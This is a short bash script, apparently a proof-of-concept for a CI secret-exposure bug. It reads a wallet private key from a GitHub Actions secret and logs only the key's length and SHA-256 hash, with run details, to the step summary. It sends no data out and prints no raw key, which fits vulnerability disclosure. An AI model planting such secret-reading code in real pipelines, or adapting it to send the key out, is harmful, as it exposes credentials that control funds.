#!/usr/bin/env bash
set -euo pipefail
K="${PRIVATE_KEY_PAUSER_WALLET:-}"
LEN=${#K}
SHA=$(printf '%s' "$K" | sha256sum | cut -d' ' -f1)
echo "POC_SECRET_ACCESS event=${GITHUB_EVENT_NAME} repo=${GITHUB_REPOSITORY} ref=${GITHUB_REF} secret_len=${LEN} sha256=${SHA}" | tee -a "${GITHUB_STEP_SUMMARY:-/dev/stdout}"
